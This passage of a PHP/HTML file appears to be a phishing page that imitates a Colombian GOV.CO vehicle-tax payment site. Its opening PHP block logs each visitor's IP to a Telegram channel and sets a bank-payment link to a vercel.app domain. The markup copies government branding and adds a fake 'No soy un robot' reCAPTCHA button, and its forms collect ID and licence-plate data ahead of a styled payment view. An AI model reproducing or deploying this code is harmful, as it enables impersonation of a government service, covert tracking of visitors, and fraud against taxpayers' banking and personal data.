<?php
$apiFrontendKey = '';
$apiConfigPath = __DIR__ . '/api/privado/config.php';
if (is_file($apiConfigPath)) {
    $apiConfig = require $apiConfigPath;
    if (is_array($apiConfig) && !empty($apiConfig['api_keys'][0])) {
        $apiFrontendKey = (string) $apiConfig['api_keys'][0];
    }
}

$pseConfig = [];
$pseConfigPath = __DIR__ . '/api/privado/pse-config.php';
if (is_file($pseConfigPath)) {
    $pseConfig = require $pseConfigPath;
}
$PSE_PRIMARY_BANKS = $pseConfig['primary_banks'] ?? [];
$PSE_PRIMARY_PAGE = $pseConfig['links']['primary_page'] ?? 'https://pagosonline-pse.vercel.app';
$PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];

require_once __DIR__ . '/api/privado/telegram.php';
$ip = veh_get_ip();
$userAgent = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '—');
veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
    '📄 Página' => 'index.php',
    '🌐 IP' => $ip,
]);
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paga tu impuesto vehicular</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=Work+Sans:wght@400;500;600;700&display=swap');

        :root {
            --bg: #ffffff;
            --surface: #ffffff;
            --surface-muted: #ececec;
            --surface-card: #fbfbfb;
            --primary: #004884;
            --primary-soft: #86a0df;
            --primary-active: #3366cc;
            --blue-bar: #3366cc;
            --red-line: #d11f2f;
            --yellow-band: #f2a900;
            --text: #4d4d4d;
            --text-dark: #2c2c2c;
            --border: #d9e3f0;
            --field-border: #9f9f9f;
            --danger: #c61a25;
            --white: #ffffff;
            --shadow: 0 10px 26px rgba(0, 0, 0, 0.02);
            --font-heading: 'Montserrat', Arial, Helvetica, sans-serif;
            --font-body: 'Work Sans', Arial, Helvetica, sans-serif;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: var(--font-body);
            font-weight: 400;
            background: var(--bg);
            color: var(--text);
        }

        a {
            color: inherit;
        }

        .topbar {
            background: var(--blue-bar);
            color: var(--white);
        }

        .topbar__inner,
        .page,
        .footer__inner {
            width: min(100%, 1160px);
            margin: 0 auto;
        }

        .topbar__inner {
            min-height: 42px;
            padding: 0 22px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .gov-brand,
        .footer-brand {
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }

        .gov-brand {
            width: auto;
            min-height: 18px;
        }

        .gov-brand img,
        .footer-brand img {
            display: block;
        }

        .gov-brand .brand-image {
            width: auto;
            min-height: 18px;
            height: 18px;
        }

        .footer-brand .brand-image {
            width: 164px;
            height: auto;
        }

        .brand-country {
            width: 76px;
            height: auto;
        }

        .topbar__link {
            color: var(--white);
            font-size: 12px;
            font-family: var(--font-body);
            font-weight: 600;
            text-decoration: none;
        }

        .topbar__link span {
            text-decoration: underline;
            text-underline-offset: 2px;
        }

        .topbar__redline {
            height: 4px;
            background: var(--red-line);
        }

        .page {
            padding: 26px 24px 0;
        }

        .hero {
            width: min(100%, 830px);
            margin: 0 auto;
            padding-top: 2px;
            text-align: left;
        }

        .hero h1 {
            margin: 0;
            color: var(--primary);
            font-size: 42px;
            line-height: 1.03;
            font-weight: 800;
            letter-spacing: -0.028em;
            text-transform: uppercase;
            font-family: var(--font-heading);
        }

        .hero__desktop-title {
            display: block;
        }

        .hero__mobile-title {
            display: none;
        }

        .hero p {
            max-width: 760px;
            margin: 10px 0 0;
            font-size: 16px;
            line-height: 1.4;
            font-weight: 400;
            font-family: var(--font-body);
        }

        .hero p strong {
            color: #454545;
            font-weight: 600;
        }

        .content {
            margin: 36px auto 0;
            display: grid;
            grid-template-columns: minmax(0, 388px) minmax(0, 430px);
            gap: 26px;
            align-items: start;
            justify-content: center;
        }

        .panel,
        .info-shell {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 28px;
            box-shadow: var(--shadow);
        }

        .panel {
            padding: 28px 24px 26px;
        }

        .search-form {
            display: block;
        }

        .info-shell {
            background: var(--surface-muted);
            border-color: transparent;
            padding: 16px;
        }

        .field {
            margin-bottom: 34px;
        }

        .field label,
        .checkbox-label {
            display: block;
            font-size: 15px;
            line-height: 1.35;
            color: #535353;
            font-family: var(--font-body);
            font-weight: 500;
        }

        .required {
            color: var(--danger);
            font-weight: 700;
            margin-right: 8px;
        }

        .control,
        .select-wrap select {
            width: 100%;
            height: 38px;
            padding: 0 12px;
            border: 2px solid var(--field-border);
            border-radius: 6px;
            background: #ffffff;
            color: #6f6f6f;
            font-size: 14px;
            font-family: var(--font-body);
            font-weight: 400;
            outline: none;
        }

        .control::placeholder {
            color: #a3a3a3;
        }

        .select-wrap {
            position: relative;
            margin-top: 8px;
        }

        .select-wrap select {
            appearance: none;
            -webkit-appearance: none;
            padding-right: 44px;
        }

        .select-wrap::after {
            content: "";
            position: absolute;
            right: 15px;
            top: 50%;
            width: 9px;
            height: 9px;
            border-right: 2px solid var(--blue-bar);
            border-bottom: 2px solid var(--blue-bar);
            transform: translateY(-65%) rotate(45deg);
            pointer-events: none;
        }

        .field .control {
            margin-top: 8px;
        }

        .error {
            display: none;
            margin-top: 6px;
            color: var(--danger);
            font-size: 12px;
            line-height: 1.25;
            font-weight: 500;
        }

        .field.has-error .error {
            display: block;
        }

        .field.has-error .control {
            border-color: var(--danger);
        }

        .control:focus,
        .select-wrap select:focus {
            border-color: #7a95d8;
        }

        .captcha {
            margin: 18px auto 22px;
            width: min(100%, 286px);
            min-height: 72px;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            background: var(--white);
            border: 1px solid #d7d7d7;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
            cursor: pointer;
            transition: box-shadow 0.2s ease, transform 0.2s ease;
        }

        .captcha__left {
            display: flex;
            align-items: center;
            gap: 12px;
            color: #111;
            font-size: 14px;
            font-weight: 400;
        }

        .captcha__label-wrap {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .captcha__checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #6d6d6d;
            background: #ffffff;
            position: relative;
            display: grid;
            place-items: center;
            overflow: hidden;
        }

        .captcha:hover {
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.18);
        }

        .captcha:active {
            transform: scale(0.995);
        }

        .captcha__spinner,
        .captcha__check {
            position: absolute;
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        .captcha__spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #d9d9d9;
            border-top-color: #4d90fe;
            border-radius: 50%;
        }

        .captcha__check {
            width: 15px;
            height: 9px;
            border-left: 3px solid #1a73e8;
            border-bottom: 3px solid #1a73e8;
            transform: rotate(-45deg) scale(0.7);
            transform-origin: center;
        }

        .captcha__label {
            line-height: 1.2;
        }

        .captcha__state {
            min-height: 14px;
            font-size: 10px;
            line-height: 1.2;
            color: #7a7a7a;
            text-align: left;
        }

        .captcha.is-verifying .captcha__spinner {
            opacity: 1;
            animation: captcha-spin 0.85s linear infinite;
        }

        .captcha.is-checked .captcha__checkbox {
            border-color: #1a73e8;
            background: #f4f8ff;
        }

        .captcha.is-checked .captcha__check {
            opacity: 1;
            transform: rotate(-45deg) scale(1);
        }

        .captcha.is-checked .captcha__state {
            color: #1a73e8;
        }

        .captcha__badge {
            width: 62px;
            text-align: center;
            color: #555;
            font-size: 9px;
            line-height: 1.2;
            flex: 0 0 auto;
        }

        .captcha__badge img {
            display: block;
            width: 30px;
            height: 30px;
            margin: 0 auto 3px;
        }

        .captcha__brand {
            display: block;
            font-size: 9px;
            color: #555;
        }

        .terms {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin: 0 0 20px;
        }

        .terms__checkbox {
            width: 21px;
            height: 21px;
            margin-top: 4px;
            border-radius: 4px;
            border: 1px solid #adadad;
            flex: 0 0 auto;
            accent-color: #3366d6;
        }

        .terms a {
            color: #3366db;
        }

        .actions {
            display: flex;
            gap: 16px;
            justify-content: center;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 165px;
            min-height: 38px;
            flex: 1 1 0;
            height: 38px;
            padding: 8px 30px;
            border-radius: 999px;
            font-size: 16px;
            font-weight: 500;
            line-height: 1;
            letter-spacing: 0;
            text-transform: uppercase;
            cursor: pointer;
            font-family: var(--font-body);
            text-decoration: none;
            border: 0;
            transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }

        .btn--ghost {
            border: 3px solid #3366d6;
            color: #3366d6;
            background: transparent;
        }

        .btn--primary {
            color: var(--white);
            background: var(--primary-soft);
            cursor: not-allowed;
        }

        .btn--primary.is-ready {
            background: var(--primary-active);
            cursor: pointer;
        }

        .btn--primary:disabled {
            opacity: 1;
        }

        .info-card {
            background: var(--surface-card);
            border-radius: 14px;
            padding: 18px 18px 14px 18px;
        }

        .info-shell__heading {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 16px;
            color: #4b4b4b;
            font-family: var(--font-body);
        }

        .info-shell__heading-icon {
            flex: 0 0 auto;
            margin-top: 2px;
        }

        .info-shell__heading-text {
            font-size: 16px;
            line-height: 1.1;
            font-weight: 700;
        }

        .info-card__heading {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            color: #4b4b4b;
            font-size: 16px;
            font-weight: 600;
            font-family: var(--font-body);
        }

        .info-card__icon {
            flex: 0 0 auto;
        }

        .info-card ul {
            margin: 0 0 12px 24px;
            padding: 0;
            color: #5a5a5a;
            font-size: 13px;
            line-height: 1.4;
            font-weight: 400;
            font-family: var(--font-body);
        }

        .info-card ul+ul {
            margin-top: 10px;
        }

        .accordion {
            margin-top: 10px;
        }

        .accordion__trigger {
            width: 100%;
            padding: 0 0 10px;
            border: 0;
            border-bottom: 2px solid #dbe5f3;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: #4b4b4b;
            font-size: 13px;
            font-weight: 600;
            cursor: default;
            font-family: var(--font-body);
        }

        .accordion__chevron {
            width: 8px;
            height: 8px;
            border-right: 2px solid #3366cc;
            border-bottom: 2px solid #3366cc;
            transform: rotate(45deg);
            margin-right: 8px;
        }

        .results {
            width: min(100%, 1160px);
            margin: 44px auto 0;
        }

        .results--hidden {
            display: none;
        }

        .results [hidden] {
            display: none !important;
        }

        .results__loader,
        .results__error {
            border: 1px solid var(--border);
            border-radius: 24px;
            background: #f7faff;
            padding: 28px 24px;
            box-shadow: var(--shadow);
        }

        .results__loader {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            color: #2357b8;
            font-size: 16px;
            font-weight: 600;
        }

        .results__spinner {
            width: 28px;
            height: 28px;
            border: 3px solid rgba(51, 102, 204, 0.18);
            border-top-color: #3366cc;
            border-radius: 50%;
            animation: captcha-spin 0.85s linear infinite;
        }

        .results__error {
            background: #fff7f7;
            border-color: #f0cccc;
            color: #9c1f1f;
            font-size: 15px;
            line-height: 1.45;
        }

        .results__content {
            display: grid;
            gap: 28px;
        }

        .results__notice {
            color: #444;
            font-size: 16px;
            line-height: 1.45;
        }

        .results__lead {
            margin: 0 0 18px;
            font-size: 19px;
            line-height: 1.35;
            font-weight: 700;
            color: #3f3f3f;
        }

        .results__summary {
            display: grid;
            grid-template-columns: repeat(4, minmax(0, 1fr));
            gap: 14px;
            margin: 0 0 24px;
        }

        .results__summary-card {
            padding: 14px 16px;
            border-radius: 18px;
            border: 1px solid #dce6f7;
            background: #f9fbff;
        }

        .results__summary-label {
            display: block;
            margin-bottom: 4px;
            color: #6a6a6a;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.03em;
        }

        .results__summary-value {
            display: block;
            color: #2f2f2f;
            font-size: 15px;
            font-weight: 600;
            line-height: 1.35;
        }

        .results__subtitle {
            margin: 0 0 12px;
            color: #3f3f3f;
            font-size: 18px;
            font-weight: 700;
        }

        .results__list {
            margin: 0 0 22px 22px;
            padding: 0;
            color: #4e4e4e;
            font-size: 16px;
            line-height: 1.5;
        }

        .results__list li+li {
            margin-top: 4px;
        }

        .results__list a {
            color: #0b66d6;
            text-decoration: none;
        }

        .results__list a:hover {
            text-decoration: underline;
        }

        .results__after {
            margin: 0;
            color: #555;
            font-size: 16px;
            line-height: 1.45;
        }

        .results__table-block {
            display: grid;
            gap: 12px;
        }

        .results__heading {
            margin: 0;
            color: #4b4b4b;
            font-size: 26px;
            font-weight: 500;
            font-family: var(--font-body);
        }

        .table-responsive {
            overflow-x: auto;
            border-radius: 18px;
            border: 1px solid #e3e7ee;
            background: #fff;
        }

        .table {
            width: 100%;
            border-collapse: collapse;
            min-width: 1120px;
        }

        .table thead th {
            padding: 14px 10px 12px;
            background: #eef1f5;
            color: #3d556e;
            font-size: 14px;
            font-weight: 500;
            text-align: left;
            vertical-align: bottom;
            border-bottom: 2px solid #e0e4ea;
        }

        .table tbody td {
            padding: 12px 10px;
            color: #444;
            font-size: 14px;
            line-height: 1.35;
            border-bottom: 1px solid #edf0f4;
            vertical-align: top;
        }

        .table tbody tr:last-child td {
            border-bottom: 0;
        }

        .responsive-table-link {
            color: #0b66d6;
            text-decoration: none;
            font-weight: 600;
        }

        .responsive-table-link:hover {
            text-decoration: underline;
        }

        .responsive-table-link--disabled {
            color: #9aa3af;
            text-decoration: none;
            cursor: default;
            pointer-events: none;
        }

        .page.page--payment-active>.hero,
        .page.page--payment-active>.content,
        .page.page--payment-active>.results {
            display: none;
        }

        .payment-view {
            display: none;
            width: min(100%, 1160px);
            margin: 18px auto 0;
            padding: 40px 54px 46px;
            border-radius: 28px;
            background: #f3f3f3;
        }

        .page.page--payment-active>.payment-view {
            display: block;
        }

        .payment-layout {
            display: grid;
            grid-template-columns: 376px minmax(0, 1fr);
            gap: 58px;
            align-items: start;
        }

        .payment-ticket {
            position: relative;
            background: #fff;
            border-radius: 22px;
            padding: 34px 30px 42px;
            box-shadow: 0 14px 32px rgba(0, 0, 0, 0.06);
            overflow: hidden;
        }

        .payment-ticket::after {
            content: "";
            position: absolute;
            left: 16px;
            right: 16px;
            bottom: -16px;
            height: 32px;
            background:
                radial-gradient(circle at 16px 0, transparent 15px, #fff 16px) repeat-x;
            background-size: 48px 32px;
        }

        .payment-ticket__title {
            margin: 0 0 10px;
            color: #4a4a4a;
            font-size: 22px;
            font-weight: 700;
        }

        .payment-ticket__label {
            display: block;
            margin-bottom: 6px;
            color: #8a8a8a;
            font-size: 12px;
            letter-spacing: 0.12em;
            text-transform: uppercase;
        }

        .payment-ticket__amount {
            margin: 0 0 22px;
            color: #004884;
            font-size: 44px;
            line-height: 1;
            font-weight: 800;
            font-family: var(--font-heading);
        }

        .payment-ticket__divider {
            border: 0;
            border-top: 2px dashed #dadada;
            margin: 0 0 22px;
        }

        .payment-ticket__meta {
            display: grid;
            gap: 12px;
        }

        .payment-ticket__meta-item {
            display: grid;
            gap: 4px;
        }

        .payment-ticket__meta-key {
            color: #4e79e7;
            font-size: 13px;
            letter-spacing: 0.08em;
        }

        .payment-ticket__meta-value {
            color: #4b4b4b;
            font-size: 17px;
            line-height: 1.35;
            font-weight: 500;
        }

        .payment-ticket__security {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 28px;
            color: #7b7b7b;
            font-size: 11px;
            line-height: 1.3;
            letter-spacing: 0.08em;
            text-transform: uppercase;
        }

        .payment-main {
            padding-top: 8px;
        }

        .payment-main__title {
            margin: 0;
            color: #3366cc;
            font-size: 34px;
            line-height: 1.05;
            font-weight: 800;
            font-family: var(--font-heading);
        }

        .payment-main__subtitle {
            margin: 10px 0 28px;
            color: #666;
            font-size: 16px;
            line-height: 1.45;
        }

        .payment-form {
            display: grid;
            gap: 18px;
        }

        .payment-form__section-title {
            margin: 0;
            color: #4f4f4f;
            font-size: 18px;
            font-weight: 700;
        }

        .payment-grid {
            display: grid;
            grid-template-columns: repeat(2, minmax(0, 1fr));
            gap: 16px 18px;
        }

        .payment-field {
            display: grid;
            gap: 8px;
        }

        .payment-field--full {
            grid-column: 1 / -1;
        }

        .payment-field label {
            color: #5a5a5a;
            font-size: 15px;
            font-weight: 500;
        }

        .payment-select-wrap {
            position: relative;
        }

        .payment-select-wrap::after {
            content: "";
            position: absolute;
            right: 15px;
            top: 50%;
            width: 9px;
            height: 9px;
            border-right: 2px solid #3366cc;
            border-bottom: 2px solid #3366cc;
            transform: translateY(-65%) rotate(45deg);
            pointer-events: none;
        }

        .payment-control {
            width: 100%;
            height: 40px;
            padding: 0 12px;
            border: 2px solid #a6a6a6;
            border-radius: 6px;
            background: #fff;
            color: #4f4f4f;
            font-size: 15px;
            font-family: var(--font-body);
            outline: none;
        }

        .payment-control::placeholder {
            color: #a1a1a1;
        }

        .payment-select-wrap .payment-control {
            appearance: none;
            -webkit-appearance: none;
            padding-right: 42px;
        }

        .payment-error {
            min-height: 18px;
            color: #e33a3a;
            font-size: 12px;
            line-height: 1.25;
        }

        .payment-consent {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-top: 8px;
        }

        .payment-consent__checkbox {
            width: 22px;
            height: 22px;
            margin-top: 1px;
            accent-color: #3366cc;
            flex: 0 0 auto;
        }

        .payment-consent__text {
            color: #555;
            font-size: 15px;
            line-height: 1.5;
        }

        .payment-consent__text a {
            color: #3366cc;
        }

        .payment-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 18px;
            margin-top: 10px;
        }

        .payment-btn {
            min-width: 162px;
            height: 38px;
            padding: 8px 22px;
            border-radius: 999px;
            border: 0;
            font-size: 16px;
            font-weight: 600;
            font-family: var(--font-body);
            cursor: pointer;
            transition: background-color 0.18s ease, color 0.18s ease, border-color 0.18s ease, opacity 0.18s ease;
        }

        .payment-btn--ghost {
            border: 3px solid #3366d6;
            background: #fff;
            color: #3366d6;
        }

        .payment-btn--primary {
            min-width: 190px;
            background: #d0d0d0;
            color: #fff;
            cursor: not-allowed;
        }

        .payment-btn--primary.is-ready {
            background: #2e4fc1;
            cursor: pointer;
        }

        .payment-btn:disabled {
            opacity: 1;
        }

        .footer {
            position: relative;
            display: block;
            padding-top: 60px;
            clear: both;
            background-color: var(--bg);
            overflow: hidden;
        }

        .footer__band {
            height: 114px;
            background: var(--yellow-band);
        }

        .footer__main {
            background: #3366cc;
            border-bottom-left-radius: 28px;
            border-bottom-right-radius: 28px;
        }

        .footer__inner {
            min-height: 118px;
            padding: 0 24px;
            display: flex;
            align-items: center;
        }

        .footer-brand {
            gap: 8px;
        }

        @keyframes captcha-spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 960px) {
            .content {
                grid-template-columns: 1fr;
                max-width: 600px;
            }

            .info-shell {
                display: block;
                padding: 14px;
            }

            .footer {
                padding-top: 30px;
            }

            .results__summary {
                grid-template-columns: repeat(2, minmax(0, 1fr));
            }

            .payment-layout {
                grid-template-columns: 1fr;
                gap: 28px;
            }

            .payment-view {
                padding: 30px 26px 34px;
                border-radius: 24px;
            }

            .payment-main {
                padding-top: 0;
            }
        }

        @media (max-width: 700px) {
            .topbar__inner {
                padding: 0 26px;
                min-height: 60px;
            }

            .gov-brand .brand-image {
                height: 18px;
            }

            .footer-brand .brand-image {
                width: 135px;
            }

            .brand-country {
                width: 58px;
            }

            .topbar__link {
                font-size: 16px;
            }

            .page {
                padding: 36px 28px 0;
            }

            .hero {
                max-width: 100%;
                text-align: left;
            }

            .hero h1 {
                font-size: 31px;
                line-height: 1.06;
            }

            .hero__desktop-title {
                display: none;
            }

            .hero__mobile-title {
                display: block;
            }

            .hero p {
                max-width: none;
                margin: 20px 0 0;
                font-size: 16px;
                line-height: 1.38;
            }

            .content {
                margin-top: 26px;
                gap: 20px;
            }

            .panel {
                padding: 28px 28px 30px;
                border-radius: 32px;
            }

            .info-shell {
                padding: 12px;
                border-radius: 28px;
            }

            .info-card {
                padding: 16px 16px 12px;
            }

            .info-shell__heading {
                margin-bottom: 14px;
            }

            .info-shell__heading-text {
                font-size: 15px;
            }

            .field {
                margin-bottom: 26px;
            }

            .field label,
            .checkbox-label {
                font-size: 15px;
            }

            .control,
            .select-wrap select {
                height: 50px;
                padding: 0 14px;
                font-size: 14px;
            }

            .error {
                font-size: 12px;
            }

            .captcha {
                width: 100%;
                min-height: 76px;
                padding: 10px 12px;
            }

            .captcha__left {
                gap: 12px;
                font-size: 14px;
            }

            .captcha__state {
                font-size: 10px;
            }

            .captcha__checkbox {
                width: 30px;
                height: 30px;
            }

            .captcha__badge {
                width: 62px;
                font-size: 9px;
            }

            .captcha__badge img {
                width: 32px;
                height: 32px;
            }

            .terms {
                margin: 4px 0 24px;
                gap: 12px;
            }

            .terms input,
            .terms__checkbox {
                width: 22px;
                height: 22px;
                margin-top: 1px;
            }

            .terms .checkbox-label {
                font-size: 14px;
                line-height: 1.45;
            }

            .actions {
                gap: 12px;
            }

            .btn {
                min-width: 0;
                min-height: 46px;
                height: 46px;
                font-size: 16px;
            }

            .results {
                margin-top: 30px;
            }

            .results__loader,
            .results__error {
                padding: 20px 16px;
            }

            .results__content {
                gap: 22px;
            }

            .results__lead {
                font-size: 17px;
            }

            .results__summary {
                gap: 10px;
                margin-bottom: 18px;
            }

            .results__summary-card {
                padding: 12px 12px;
                border-radius: 14px;
            }

            .results__summary-label {
                font-size: 11px;
            }

            .results__summary-value {
                font-size: 14px;
            }

            .results__subtitle {
                font-size: 17px;
            }

            .results__list,
            .results__after {
                font-size: 15px;
            }

            .results__heading {
                font-size: 22px;
            }

            .table thead th,
            .table tbody td {
                font-size: 13px;
            }

            .payment-ticket {
                padding: 26px 22px 36px;
            }

            .payment-ticket__amount {
                font-size: 38px;
            }

            .payment-main__title {
                font-size: 30px;
            }

            .payment-grid {
                grid-template-columns: 1fr;
                gap: 14px;
            }

            .payment-actions {
                flex-direction: column;
                align-items: stretch;
            }

            .payment-btn,
            .payment-btn--primary {
                width: 100%;
            }

            .footer__band {
                height: 84px;
            }

            .footer__inner {
                min-height: 128px;
                justify-content: center;
            }
        }

        @media (max-width: 520px) {
            .topbar__inner {
                padding: 0 24px;
            }

            .gov-brand {
                gap: 10px;
            }

            .gov-brand .brand-image {
                height: 18px;
            }

            .brand-country {
                width: 52px;
            }

            .topbar__link {
                font-size: 15px;
            }

            .page {
                padding-left: 28px;
                padding-right: 28px;
            }

            .content {
                gap: 18px;
            }

            .hero h1 {
                font-size: clamp(27px, 7.3vw, 31px);
            }

            .hero p {
                font-size: clamp(14px, 4.2vw, 16px);
            }

            .panel {
                padding-left: 18px;
                padding-right: 18px;
            }

            .field label,
            .checkbox-label,
            .terms .checkbox-label {
                font-size: 14px;
            }

            .control,
            .select-wrap select {
                height: 46px;
                font-size: 13px;
            }

            .error {
                font-size: 11px;
            }

            .captcha {
                min-height: 72px;
                width: 100%;
            }

            .captcha__left {
                font-size: 13px;
            }

            .captcha__badge {
                width: 58px;
            }

            .captcha__badge img {
                width: 28px;
                height: 28px;
            }

            .info-shell {
                padding: 10px;
            }

            .info-card {
                padding: 14px 14px 10px;
            }

            .info-shell__heading-text {
                font-size: 14px;
            }

            .actions {
                flex-wrap: nowrap;
            }

            .btn {
                flex-basis: auto;
            }

            .results__summary {
                grid-template-columns: 1fr;
            }

            .results__loader {
                font-size: 14px;
            }

            .payment-view {
                margin-top: 8px;
                padding: 24px 18px 28px;
                border-radius: 22px;
            }

            .payment-ticket__title {
                font-size: 20px;
            }

            .payment-ticket__amount {
                font-size: 34px;
            }

            .payment-main__title {
                font-size: 27px;
            }

            .payment-main__subtitle,
            .payment-consent__text,
            .payment-field label,
            .payment-control {
                font-size: 14px;
            }

            .table-responsive {
                border: 0;
                background: transparent;
                overflow: visible;
            }

            .table {
                min-width: 0;
            }

            .table thead {
                display: none;
            }

            .table tbody {
                display: grid;
                gap: 12px;
            }

            .table tbody tr {
                display: grid;
                gap: 8px;
                padding: 14px;
                border: 1px solid #dfe5ef;
                border-radius: 18px;
                background: #fff;
            }

            .table tbody td {
                display: flex;
                justify-content: space-between;
                gap: 12px;
                padding: 0;
                border: 0;
                font-size: 13px;
                text-align: right;
            }

            .table tbody td::before {
                content: attr(data-th);
                color: #56606f;
                font-weight: 600;
                text-align: left;
            }
        }
    </style>
</head>

<body>
    <header class="topbar">
        <div class="topbar__inner">
            <div class="gov-brand" aria-label="GOV.CO">
                <img class="brand-image" src="assets/img/Group%2035_0.svg" alt="GOV.CO">
            </div>
            <a class="topbar__link" href="#">
                ir a <span>GOV.CO</span>
            </a>
        </div>
        <div class="topbar__redline"></div>
    </header>

    <main class="page" id="page-shell">
        <section class="hero">
            <h1 class="hero__desktop-title">Paga tu impuesto vehicular</h1>
            <h1 class="hero__mobile-title">Paga tu impuesto<br>vehicular</h1>
            <p>Consulta, paga y obt&eacute;n tu certificado. <strong>Ingresa los datos del impuesto a pagar.</strong>
            </p>
        </section>

        <section class="content">
            <div class="panel">
                <form class="search-form" id="vehicle-form" novalidate>
                    <div class="field">
                        <label for="tipo-documento"><span class="required">*</span>Tipo de documento</label>
                        <div class="select-wrap">
                            <select id="tipo-documento" name="tipo-documento" aria-label="Tipo de documento">
                                <option value="CC - Cédula de Ciudadanía">CC - C&eacute;dula de Ciudadan&iacute;a
                                </option>
                                <option value="CE - Cédula de Extranjería">CE - C&eacute;dula de Extranjer&iacute;a
                                </option>
                                <option value="NIT - Número de Identificación Tributaria">NIT - N&uacute;mero de
                                    Identificaci&oacute;n Tributaria</option>
                                <option value="PA - Pasaporte">PA - Pasaporte</option>
                            </select>
                        </div>
                    </div>

                    <div class="field" data-field="documento">
                        <label for="documento"><span class="required">*</span>N&uacute;mero de documento</label>
                        <input class="control" id="documento" name="documento" type="text"
                            placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off">
                        <span class="error">El campo &lsquo;N&uacute;mero de documento&rsquo; es obligatorio</span>
                    </div>

                    <div class="field" data-field="placa">
                        <label for="placa"><span class="required">*</span>Placa</label>
                        <input class="control" id="placa" name="placa" type="text"
                            placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off" maxlength="6">
                        <span class="error">El campo &lsquo;Placa&rsquo; es obligatorio</span>
                    </div>

                    <button class="captcha" id="captcha-button" type="button" aria-pressed="false">
                        <div class="captcha__left">
                            <div class="captcha__checkbox">
                                <span class="captcha__spinner" aria-hidden="true"></span>
                                <span class="captcha__check" aria-hidden="true"></span>
                            </div>
                            <div class="captcha__label-wrap">
                                <div class="captcha__label">No soy un robot</div>
                                <div class="captcha__state" id="captcha-status"></div>
                            </div>
                        </div>
                        <div class="captcha__badge">
                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
                            <span class="captcha__brand">reCAPTCHA</span>
                        </div>
                    </button>

                    <div class="terms">
                        <input class="terms__checkbox" id="accept-terms" name="accept-terms" type="checkbox">
                        <label class="checkbox-label" for="accept-terms">
                            Acepto los t&eacute;rminos y la Pol&iacute;tica de tratamiento de datos personales. <a
                                href="#">Consultar en este enlace.</a>
                        </label>
                    </div>

                    <div class="actions">
                        <button class="btn btn--ghost" id="clear-button" type="reset">Limpiar</button>
                        <button class="btn btn--primary" id="search-button" type="submit" disabled>Buscar</button>
                    </div>
                </form>
            </div>

            <aside class="info-shell">
                <div class="info-shell__heading">
                    <svg class="info-shell__heading-icon" width="28" height="28" viewBox="0 0 28 28" fill="none"
                        xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <path d="M14 2.8 5.8 6.3v6.5c0 5.2 3.4 10 8.2 11.4 4.8-1.4 8.2-6.2 8.2-11.4V6.3L14 2.8Z"
                            stroke="#3366CC" stroke-width="2.4" stroke-linejoin="round" />
                        <path d="m10.3 13.9 2.3 2.4 5-5.5" stroke="#3366CC" stroke-width="2.4" stroke-linecap="round"
                            stroke-linejoin="round" />
                    </svg>
                    <div class="info-shell__heading-text">Informaci&oacute;n importante<br>antes de consultar</div>
                </div>

                <div class="info-card">
                    <div class="info-card__heading">
                        <svg class="info-card__icon" width="26" height="26" viewBox="0 0 26 26" fill="none"
                            xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <path
                                d="M6.4 14.1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm13.2 0a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"
                                fill="#3366CC" />
                            <path
                                d="M19.7 6.3h-2.3L15.8 4H10l-1.5 2.3H6.3A3.3 3.3 0 0 0 3 9.6v7.2h2.1v2.6h2.5v-2.6h10.8v2.6h2.5v-2.6H23V9.6a3.3 3.3 0 0 0-3.3-3.3ZM6.3 8.8h13.4c.4 0 .8.4.8.8v4.7H5.4V9.6c0-.4.4-.8.9-.8Z"
                                fill="#3366CC" />
                        </svg>
                        <span>Impuesto de veh&iacute;culos</span>
                    </div>

                    <ul>
                        <li>Digita el n&uacute;mero de documento del responsable del veh&iacute;culo al 01 de enero de
                            2026 y la placa.</li>
                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin el d&iacute;gito de
                            verificaci&oacute;n.</li>
                    </ul>

                    <div class="accordion">
                        <button class="accordion__trigger" type="button">
                            <span>Casos especiales</span>
                            <span class="accordion__chevron" aria-hidden="true"></span>
                        </button>
                    </div>

                    <ul>
                        <li>Si tienes un contrato de leasing (locatario), ingresa el NIT de la entidad financiera sin el
                            d&iacute;gito de verificaci&oacute;n.</li>
                        <li>Si el veh&iacute;culo tiene varios propietarios, puedes buscar la factura con los datos de
                            cualquiera de ellos.</li>
                        <li>Si el veh&iacute;culo est&aacute; a nombre de una persona que falleci&oacute;, pero al 01 de
